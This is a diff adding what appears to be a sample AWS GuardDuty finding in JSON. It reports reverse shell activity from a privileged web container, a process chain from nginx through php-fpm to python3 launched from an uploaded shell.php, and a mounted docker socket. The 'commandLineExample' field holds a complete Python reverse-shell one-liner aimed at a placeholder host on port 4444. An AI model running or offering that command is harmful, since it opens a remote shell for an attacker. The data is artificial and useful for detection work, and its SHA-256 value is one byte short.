@@ -1,0 +1,97 @@
+ {
+  "accountId": "123456789012",
+  "arn": "arn:aws:guardduty:us-east-1:123456789012:detector/12abc34d567e8fa901bc2d34e56789ab/finding/abcd1234efgh5678ijkl9012mnop3456",
+  "createdAt": "2025-12-14T10:42:18.392Z",
+  "id": "abcd1234efgh5678ijkl9012mnop3456",
+  "region": "us-east-1",
+  "schemaVersion": "2.0",
+  "severity": 8.7,
+  "type": "Execution:Runtime/ReverseShell",
+  "updatedAt": "2025-12-14T10:42:18.392Z",
+  "confidence": 0.86,
+  "partition": "aws",
+  "title": "Runtime reverse shell activity detected",
+  "description": "A reverse shell was detected from a runtime workload to an external IP address, indicating potential post-compromise command-and-control activity.",
+  "associatedAttackSequenceArn": "arn:aws:guardduty:us-east-1:123456789012:attack-sequence/seq-9f8e7d6c5b4a3210",
+
+  "resource": {
+    "resourceType": "Container",
+    "containerDetails": {
+      "containerRuntime": "containerd",
+      "id": "9f3c2a1b7d8e4f56a0c123456789abcd",
+      "image": "public.ecr.aws/nginx/nginx:1.25",
+      "imagePrefix": "public.ecr.aws/nginx",
+      "name": "webapp-backend",
+      "securityContext": {
+        "allowPrivilegeEscalation": true,
+        "privileged": true
+      },
+      "volumeMounts": [
+        {
+          "mountPath": "/var/run/docker.sock",
+          "name": "docker-socket"
+        }
+      ]
+    }
+  },
+
+  "service": {
+    "serviceName": "GuardDuty",
+    "featureName": "Runtime Monitoring",
+    "detectorId": "12abc34d567e8fa901bc2d34e56789ab",
+    "archived": false,
+    "count": 1,
+    "eventFirstSeen": "2025-12-14T10:41:52.113Z",
+    "eventLastSeen": "2025-12-14T10:42:18.392Z",
+
+    "runtimeDetails": {
+      "context": {
+        "addressFamily": "AF_INET",
+        "ianaProtocolNumber": 6,
+        "commandLineExample": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+        "scriptPath": "/uploads/shell.php",
+        "toolCategory": "Backdoor Tool",
+        "toolName": "Python Reverse Shell"
+      },
+
+      "process": {
+        "name": "python3",
+        "executablePath": "/usr/bin/python3",
+        "executableSha256": "4d3c2f8b9a1e6d7f8c9b0a1e2d3f4c5b6a7e8f9a0b1c2d3e4f5a6b7c8d9e",
+        "pid": 421,
+        "namespacePid": 421,
+        "uuid": "proc-python3-b81f9a6d",
+        "parentUuid": "proc-php-fpm-7a9c3e12",
+        "pwd": "/var/www/html/uploads",
+        "startTime": "2025-12-14T10:41:51.902Z",
+        "user": "www-data",
+        "userId": 33,
+        "euid": 33,
+
+        "lineage": [
+          {
+            "name": "php-fpm",
+            "executablePath": "/usr/sbin/php-fpm",
+            "pid": 214,
+            "namespacePid": 214,
+            "uuid": "proc-php-fpm-7a9c3e12",
+            "parentUuid": "proc-nginx-3f91ab2c",
+            "startTime": "2025-12-14T10:41:32.417Z",
+            "userId": 33,
+            "euid": 33
+          },
+          {
+            "name": "nginx",
+            "executablePath": "/usr/sbin/nginx",
+            "pid": 102,
+            "namespacePid": 102,
+            "uuid": "proc-nginx-3f91ab2c",
+            "startTime": "2025-12-14T10:39:58.004Z",
+            "userId": 0,
+            "euid": 0
+          }
+        ]
+      }
+    }
+  }
+}
